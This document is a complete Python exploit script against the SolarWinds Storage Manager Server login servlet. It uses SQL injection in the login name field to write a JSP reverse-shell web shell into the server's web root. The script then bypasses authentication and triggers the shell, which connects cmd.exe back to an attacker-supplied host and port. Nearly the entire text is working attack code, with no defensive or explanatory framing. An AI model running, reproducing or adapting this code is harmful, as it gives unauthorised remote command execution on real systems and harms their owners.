import urllib, urllib2, cookielib
import sys
import random
 
if (len(sys.argv) != 4):
    print "[*] Usage: solarshell.py <RHOST> <LHOST> <LPORT>"
    exit(0)
 
rhost = sys.argv[1]
lhost = sys.argv[2]
lport = sys.argv[3]
 
filename = ''
for i in random.sample('abcdefghijklmnopqrstuvwxyz1234567890',6):
    filename+=i
filename +=".jsp"
 
output_path= "c:/Program Files/SolarWinds/Storage Manager Server/webapps/ROOT/%s" %filename
 
jsp = '''<%@page import="java.lang.*"%>
<%@page import="java.util.*"%>
<%@page import="java.io.*"%>
<%@page import="java.net.*"%>
 
<%
    class StreamConnector extends Thread
    {
        InputStream is;
        OutputStream os;
 
        StreamConnector( InputStream is, OutputStream os )
        {
        this.is = is;
        this.os = os;
        }
 
        public void run()
        {
        BufferedReader in  = null;
        BufferedWriter out = null;
try
{
    in  = new BufferedReader( new InputStreamReader( this.is ) );
    out = new BufferedWriter( new OutputStreamWriter( this.os ) );
    char buffer[] = new char[8192];
    int length;
    while( ( length = in.read( buffer, 0, buffer.length ) ) > 0 )
    {
        out.write( buffer, 0, length );
        out.flush();
    }
} catch( Exception e ){}
try
{
    if( in != null )
        in.close();
    if( out != null )
        out.close();
} catch( Exception e ){}
        }
    }
 
    try
    {
        Socket socket = new Socket( "''' + lhost +'''", '''+lport+''');
        Process process = Runtime.getRuntime().exec( "cmd.exe" );
        ( new StreamConnector( process.getInputStream(), socket.getOutputStream() ) ).start();
        ( new StreamConnector( socket.getInputStream(), process.getOutputStream() ) ).start();
    } catch( Exception e ) {}
%>'''
 
jsp = jsp.replace("\n","")
jsp = jsp.replace("\t","")
 
prepayload = "AAA' "
prepayload += 'union select 0x%s,2,3,4,5,6,7,8,9,10,11,12,13,14 into outfile "%s"' % (jsp.encode('hex'),output_path)
prepayload += "#"
postpayload = "1' or 1=1#--"
loginstate='checkLogin'
password = 'OHAI'
 
cj = cookielib.CookieJar()
opener = urllib2.build_opener(urllib2.HTTPCookieProcessor(cj))
post_params = urllib.urlencode({'loginState' : loginstate, 'loginName' : prepayload,'password' : password})
print "[*] Sending evil payload"
resp = opener.open("http://%s:9000/LoginServlet" %rhost, post_params)
print "[*] Triggering shell"
post_params = urllib.urlencode({'loginState' : loginstate, 'loginName' : postpayload,'password' : password})
resp = opener.open("http://%s:9000/LoginServlet" % rhost, post_params)
resp = opener.open("http://%s:9000/%s"  % (rhost,filename))
print "[*] Check your shell on %s %s\n" % (lhost,lport)
 
# 01010011 01101100 01100101 01100101 01110000 01101001 01110011 01101111 
# 01110110 01100101 01110010 01110010 01100001 01110100 01100101 01100100
